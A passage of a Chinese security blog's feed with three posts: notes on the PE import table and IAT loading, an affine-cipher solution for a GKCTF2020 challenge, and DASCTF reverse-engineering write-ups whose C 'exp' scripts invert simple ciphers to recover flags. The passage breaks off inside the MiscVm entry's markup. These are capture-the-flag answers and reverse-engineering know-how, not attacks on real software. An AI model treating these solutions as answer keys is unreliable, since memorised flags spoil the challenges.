class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics</span><br><span class="line">    <span class="comment">// 由于是一个联合, 如果这是该结构体数组的最后一</span></span><br><span class="line">    <span class="comment">// 项, 那使用 Characteristics成员,且值为 0</span></span><br><span class="line">    <span class="comment">// 否则使用下面一个成员</span></span><br><span class="line">        </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    <span class="comment">// INT(import name table)结构体数组的RVA</span></span><br><span class="line">    <span class="comment">// 数组每个成员记录了要使用函数名称与序号</span></span><br><span class="line">        </span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;                  </span><br><span class="line">    <span class="comment">// 映象绑定前，这个值是0，绑定后是导入模块的时间戳</span></span><br><span class="line">    <span class="comment">// 据说可以用来确定输入表是否绑定从而是否需要重定位</span></span><br><span class="line"> </span><br><span class="line">    DWORD   ForwarderChain;                 </span><br><span class="line">    <span class="comment">// 中转链, 输入函数列表中第一个中转的、32位的索引</span></span><br><span class="line">    <span class="comment">// 如果没有转发链, 值为 -1</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">// DLL文件的名称（0结尾的ASCII码字符串）的32位的RVA, </span></span><br><span class="line">    <span class="comment">// 所以一个导入模块对应一个这样的数组</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">    <span class="comment">//IAT(import address table)结构体数组的RVA</span></span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面的 OriginalFirstThunk(INT), FirstThunk(IAT) 成员在PE文件加载前一般是都同时指向相同地址的 IMAGE_THUNK_DATA 数组.下面是 IMAGE_THUNK_DATA32的定义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//一个联合, 所以意味着每次只能使用一个成员</span></span><br><span class="line">    <span class="keyword">union</span> </span><br><span class="line">    &#123;</span><br><span class="line">        DWORD ForwarderString;</span><br><span class="line">        <span class="comment">// 中转链,一个DLL文件能输出不定义在本DLL文件中却需从另一个</span></span><br><span class="line">        <span class="comment">// DLL文件中的函数.</span></span><br><span class="line">        </span><br><span class="line">        DWORD Function;</span><br><span class="line">        <span class="comment">// 函数的地址</span></span><br><span class="line">        </span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        <span class="comment">// 函数的序数. 由于所有成员都是同一个地址, 当最高位为1时表</span></span><br><span class="line">        <span class="comment">// 示列表中没有函数的名字信息, 只能通过本序数查找函数,</span></span><br><span class="line">        <span class="comment">// 用低16位表示的序数, 因为最高位作为标志了。</span></span><br><span class="line">        </span><br><span class="line">        DWORD AddressOfData;</span><br><span class="line">        <span class="comment">// 同上, 由于所有成员都是同一个地址, 当最高位为0时, 则使用</span></span><br><span class="line">        <span class="comment">// 本成员,用低31为表示 _IMAGE_IMPORT_BY_NAME结构的RVA</span></span><br><span class="line">        </span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面介绍的 AddressOfData成员的低<span class="number">31</span>就记录指向下面所示的 _IMAGE_IMPORT_BY_NAME 结构体数组的地址(RVA), 数组中每个成员的前<span class="number">2</span>个字节是函数的序数, 后面跟着长度不定的函数名称的字符串.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Hint;</span><br><span class="line">    <span class="comment">// 函数的序数(即索引, 与输出表中讲的一样)</span></span><br><span class="line">    BYTE Name[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 函数名称数组,记录函数的名称. 数量未定义即长度不定.</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><strong>注: 上面所讲的 OriginalFirstThunk 成员(指针数组)的值是不能改写的, 通过它寻找函数的名称.   而 FirstThunk 成员(指针数组)的值在PE文件在被PE装载器时, PE装载器会通过 OriginalFirstThunk 得到函数的名称或者序数, 然后通过函数名称在加载的.dll文件的输出表中找到函数的实际地址, 然后替换到FirstThunk的一个值.  装载完成后,  FirstThunk 数组就指向向了函数实际的地址.</strong>  另外上面的 <strong>TimeDateStamp</strong> 成员可以用来确定输入表是否绑定从而是否需要重定位, 如果它的值是0, 那么输入列表没有被绑定, 加载器总是要修复输入表.  否则输入被绑定, 但该时间戳的值必须和.dll文件头中 <strong>TimeDateStamp</strong> 的一样, 如果不一样, 仍会修正输入表, 就会进行下面的步骤.</p><blockquote><p><strong>导入函数输入到 IAT 的顺序</strong>  </p><p><strong>1.读取 _IMAGE_IMPORT_DESCRIPTOR中的name成员, 获取库名称字符串. 如(user32.dll)</strong></p><p><strong>2.装载相应的库. LoadLibrary(“user32.dll”)</strong></p><p><strong>3.读取_IMAGE_IMPORT_DESCRIPTOR中的 OriginalFirstThunk 成员, 得到 INT地址.</strong></p><p><strong>4.逐一读取 INT中数组的值, 获取相应的 IMAGE_IMPORT_BY_NAME地址(RVA)</strong></p><p><strong>5.使用 IMAGE_IMPORT_BY_NAME的Hint (ordinak/序数)或name项, 获取相应函数的起始地址.</strong> </p><p><strong>GetProcAddress(“函数名称”)</strong></p><p><strong>6.读取 IAT 成员, 获得IAT地址.</strong></p><p><strong>7.将上面获得的函数地址输入相应的IAT数组值.</strong></p></blockquote><blockquote><p><strong>8.重复 步骤 4 -7, 直到INT结束.</strong></p></blockquote><p>  <strong>图示一下, INT 与 IAT 关系 (技术太差了.png).</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519174651226-1590826622691.png" alt="image-20200519174651226"></p><p>  <strong>下面实例查看OD程序的输入表.</strong></p><p>  1.首先从PE文件可选头的 DataDirectory[1].VirtualAdress 得到输入表的RVA: <strong>10D000h</strong> 及size: <strong>1c87h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519150821954-1590826622691.png" alt="image-20200519150821954"></p><p>  2.RVA: <strong>10D000h</strong> -&gt; RAW:  <strong>(10D000-10D000+CC400) = CC400h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519151445783-1590826622692.png" alt="image-20200519151445783"></p><p>  3.找到输入表. 记录下对应成员的RVA.</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153011688-1590826622692.png" alt="image-20200519153011688"></p><p>  4.查看该输入表名称: <strong>ADVAPI32,DLL</strong>, RVA: <strong>10D9C8</strong> -&gt; RAW: <strong>(10D9C8-10D000+CC400) = CCDC8</strong> </p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153843705-1590826622692.png" alt="image-20200519153843705"></p><p>  5.查看 <strong>OriginalFirstThunk( INT )</strong>  RVA:<strong>10D0C8</strong> -&gt; RAW: <strong>(10D0C8-10D000+CC400) = CC4C8</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519155230578-1590826622692.png" alt="image-20200519155230578"></p><p>  6.可以看到第一成员的最高位是 0, 则该值是IMAGE_IMPORT_BY_NAME的RVA.(RVA: <strong>10DA33</strong> -&gt; RAW: <strong>CCE33</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519160556676-1590826622692.png" alt="image-20200519160556676"></p><p>  7.查看 FirstThunk( IAT ) RVA: <strong>10D0E4</strong> -&gt; RAW: <strong>(10D0E4-10D000+CC400) = CC4E4</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519163851829-1590826622692.png" alt="image-20200519163851829"></p><p>  8.从步骤7可以看到, PE装载器装载PE文件之前, INT与IAT各元素同时指向相同的地址.</p><p>  9.再看 TimeDateStamp 成员的值为 0, 那就是输入表被绑定, 如果与该对应 .dll PE文件的文件头的 TimeDateStamp的值相同,  那这个输入表是不需要修正的.</p><p>  10.从上面知道 IAT 的RVA: <strong>10D0E4</strong>.  库名称: <strong>ADVAPI32,DLL</strong>另外使用一个OD载入这个OD程序看看. 可以看到加载该.dll文件文件的RVA是从 <strong>FC0000</strong>开始的,  而查看未被PE装载器装载前的状态, IAT的RVA是 <strong>10D0E4</strong>,所以显然这是需要PE装载器装载时对输入表修正的, 那也可推出他们的 TimeDateStamp 的值是不同的</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519164915615-1590826622692.png" alt="image-20200519164915615"></p><blockquote><p>输入表与输出表联系还是比较大, 结合起来看看清楚很多.</p></blockquote><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-基础概念&quot;&gt;&lt;a href=&quot;#0x1-基础概念&quot; class=&quot;headerlink&quot; title=&quot;0x1 基础概念:&quot;&gt;&lt;/a&gt;0x1 基础概念:&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;EXE文件和DLL文件基本上只是语义上的区别, 唯一区别是有一个标识字段指出EXE或DLL, 常见的PE文件格式有:DLL，EXE，OCX，SYS, SCR, CPL, OBJ等&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;64位的PE文件格式, 做了简单的修饰, 叫PE32+/PE+, 32位字段扩展位64字段&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;PE格式的定义地方在 &lt;code&gt;winnt.h&lt;/code&gt; 头文件中我们能在其中找到PE文件的定义&lt;/strong&gt;  &lt;strong&gt;&lt;em&gt;如下图VC的路径查找&lt;/em&gt;&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
    
    </summary>
    
    
      <category term="PE" scheme="https://www.Bxnop.cn/categories/PE/"/>
    
    
      <category term="系统" scheme="https://www.Bxnop.cn/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Crypto</title>
    <link href="https://www.bxnop.cn/2020/05/29/Crypto/"/>
    <id>https://www.bxnop.cn/2020/05/29/Crypto/</id>
    <published>2020-05-29T09:30:45.000Z</published>
    <updated>2020-06-29T07:14:22.988Z</updated>
    
    <content type="html"><![CDATA[<h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><blockquote><p>仿射密码是是加法密码与乘法密码的结合。它一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。加密后字母的大小写不变的。</p></blockquote><ul><li>加密函数：<strong>E(x) = (ax + b) (mod m)</strong>，其中a与m互为质数，这也是能求a逆模的必要条件。</li><li>解密函数：<strong>D(x) = a^-1(x - b)(mod m)</strong>，其中 a^-1为a在Zm群的逆元。</li></ul><blockquote><p>当 a = 1时相当于凯撒密码， 其实整个密码就是凯撒密码那种意思，只是加强版吧。</p><p>对于求逆元可以直接使用python gmpy2库的 invert() 方法。<a id="more"></a></p></blockquote><p>以GKCTF2020中第一道 Crypto 作为练手。</p><p><img src="/2020/05/29/Crypto/image-20200529175847900.png" alt="image-20200529175847900"></p><ul><li><p>首先知道 a = 11，b = 6，m = 26。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"welcylk"</span>:</span><br><span class="line">    flag += chr(((ord(i)<span class="number">-97</span>)<span class="number">-6</span>)*gmpy2.invert(<span class="number">11</span>, <span class="number">26</span>)%<span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">flag = bytes(flag, encoding = <span class="string">"utf-8"</span>) <span class="comment">#将str转化为byte类型。</span></span><br><span class="line">flag = base64.b64encode(flag)<span class="comment">#这里只能使用byte类型。</span></span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><blockquote><p>python中str与byte区别：</p><p>Python3严格区分文本（str）和二进制数据（Bytes），文本总是Unicode，用str类型，二进制数据则用Bytes类型表示。</p><p>str -&gt; byte：</p><p>s = bytes(s, encoding = “utf-8”)</p><p>s = s.encode()</p><p>s = s.encode(encoding = “utf-8”)</p><p>byte -&gt; str：</p><p>s = str(s, encoding = “utf-8”)</p><p>s = bytes.decode(s)</p><p>s = s.decode()</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;仿射密码&quot;&gt;&lt;a href=&quot;#仿射密码&quot; class=&quot;headerlink&quot; title=&quot;仿射密码&quot;&gt;&lt;/a&gt;仿射密码&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;仿射密码是是加法密码与乘法密码的结合。它一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。加密后字母的大小写不变的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;加密函数：&lt;strong&gt;E(x) = (ax + b) (mod m)&lt;/strong&gt;，其中a与m互为质数，这也是能求a逆模的必要条件。&lt;/li&gt;
&lt;li&gt;解密函数：&lt;strong&gt;D(x) = a^-1(x - b)(mod m)&lt;/strong&gt;，其中 a^-1为a在Zm群的逆元。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;当 a = 1时相当于凯撒密码， 其实整个密码就是凯撒密码那种意思，只是加强版吧。&lt;/p&gt;
&lt;p&gt;对于求逆元可以直接使用python gmpy2库的 invert() 方法。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://www.Bxnop.cn/categories/Crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>2020年DASCTF五月线上赛</title>
    <link href="https://www.bxnop.cn/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-05-23T12:00:53.000Z</published>
    <updated>2020-08-15T07:57:30.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="ViQinere"><a href="#ViQinere" class="headerlink" title="ViQinere"></a>ViQinere</h3><ul><li><p>64位elf文件, 载入ida后发现与以往的不同. 很多函数都没显示出来.</p></li><li><p>linux中运行一下, 显示对flag加密, 然后是一些乱码.  后来群里通知, 这个有靶机.</p></li><li><p>nc连接一下, 那题目的flag存放在服务器, 文件操作取出flag, 经过加密. <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523203121150.png" alt="image-20200523203121150"></p><a id="more"></a></li><li><p>接着再在ida中看一下, 有几个字符很懵, 后面才发现就是改变输出字符串样式, 这也是为什么linux中运行的时候会有涂鸦与闪动, <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204020172.png" alt="image-20200523204020172"></p></li><li><p>然后是被涂鸦的那一段坑了, 显示 <strong>Flag was encrypted by <a href="http://cc.TaQini.space" target="_blank" rel="noopener">http://cc.TaQini.space</a></strong> , 一直以为加密和这个有关,  嗯…后来发现是题目作者给自己打的广告. </p></li><li><p>虽然很多函数不能显示出来, 但也是能猜出来作用. 看看汇编会更清楚. </p></li><li><p>最后找到加密函数 <strong>sub_1249((__int64)byte_4080);</strong>, 这下就好办了.   进去函数可以知道, 大写字母加密为大写字母, 小写字母加密为小写字母, 其他字符不变.<img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204833774.png" alt="image-20200523204833774"></p></li><li><p>对于逆这个算法, 没有过多的想, 算是直接穷尽的吧(算法太菜).  因为大写字母变大写字母,小写字母变小写字母.</p></li><li><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1209</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt;= <span class="number">97</span> &amp;&amp; a &lt;= <span class="number">122</span>)</span><br><span class="line"><span class="keyword">return</span> a<span class="number">-97</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">65</span> &amp;&amp; a &lt;= <span class="number">90</span>)</span><br><span class="line"><span class="keyword">return</span> (a<span class="number">-65</span>)^<span class="number">0xFFFFFF80</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v4 = <span class="number">0</span>, j = <span class="number">0</span>, v2 = <span class="number">0</span>, v5 = <span class="number">0</span>, v1 = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"TaQini"</span>;</span><br><span class="line"><span class="keyword">char</span> c[] = <span class="string">"FQD&#123;GfjuJ5UbLrWjZjpvErXkiAZzlvO0xTa!cwnLLAsy3B0iEvEy&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = <span class="number">122</span>-i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((c[i] &gt;= <span class="number">97</span> &amp;&amp; c[i] &lt;= <span class="number">122</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v2 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[((v2&amp;<span class="number">0x7F</span>) + v4)%<span class="number">26</span>])</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">65</span>; j &lt;= <span class="number">90</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v1 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[(v4+(v1 &amp; <span class="number">0x7F</span>) + <span class="number">128</span>)%<span class="number">26</span>] - <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最后补充一下对改变输出字符串的知识。</p><table><thead><tr><th>\033[0m</th><th>关闭所有属性</th></tr></thead><tbody><tr><td><strong>\033[01m</strong></td><td><strong>设置高亮度</strong></td></tr><tr><td><strong>\033[04m</strong></td><td><strong>下划线</strong></td></tr><tr><td><strong>\033[05m</strong></td><td><strong>闪烁</strong></td></tr><tr><td><strong>\033[07m</strong></td><td><strong>反显</strong></td></tr><tr><td><strong>\033[08m</strong></td><td><strong>消隐</strong></td></tr><tr><td><strong>\033[30m – \033[37m</strong></td><td><strong>设置前景色</strong></td></tr><tr><td><strong>\033[40m – \033[47m</strong></td><td><strong>设置背景色</strong></td></tr><tr><td><strong>\033[nA</strong></td><td><strong>光标上移n行</strong></td></tr><tr><td><strong>\033[nB</strong></td><td><strong>光标下移n行</strong></td></tr><tr><td><strong>\033[nC</strong></td><td><strong>光标右移n行</strong></td></tr><tr><td><strong>\033[nD</strong></td><td><strong>光标左移n</strong></td></tr><tr><td><strong>\033[y;xH</strong></td><td><strong>设置光标位置</strong></td></tr><tr><td><strong>\033[2J</strong></td><td><strong>清屏</strong></td></tr><tr><td><strong>\033[K</strong></td><td><strong>清除从光标到行尾的内容</strong></td></tr><tr><td><strong>\033[s</strong></td><td><strong>保存光标位置</strong></td></tr><tr><td><strong>\033[u</strong></td><td><strong>恢复光标位置</strong></td></tr><tr><td><strong>\033[?25l</strong></td><td><strong>隐藏光标</strong></td></tr><tr><td><strong>\033[?25h</strong></td><td><strong>显示光标</strong></td></tr></tbody></table></li><li><p><strong>总结: 题本来很简单, 主要几次被带入坑. 也是没经验。</strong></p></li></ul><hr><h3 id="MiscVm"><a href="#MiscVm" class="headerlink" title="MiscVm"></a>MiscVm</h3><ul><li><p>下载下来, 64位的无壳elf文件和一个操作码文件.  操作码其实题中也有, 这里单独给了方便很多.</p></li><li><p>载入ida. C++逆向类的, 但还好都是很基本的语法. <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075414831.png" alt="image-20200524075414831"></p></li><li><p>分别进去三个加密函数. 第一个: <strong>sub_19E2((int64)&amp;v13</strong>, (__int64)&amp;v14);很简单,   就是 2个数的值交换.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075631032.png" alt="image-20200524075631032"></p></li><li><p>第二个: <strong>sub_1551((int64)&amp;v14, (int64)&amp;v13);</strong>,  就是按照给定顺序进行简单的值交换.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075954652.png" alt="image-20200524075954652"></p></li><li><p>第三个: <strong>v8 = (unsigned int)sub_EEC(&amp;v14, &amp;v15, 0LL) != 0</strong>,   这个相对于要麻烦一些, 但分析一下, 思路理清, 逆回去就好了.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083055817.png" alt="image-20200524083055817"></p></li><li><p>exp: C语言写的, 比较冗长. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 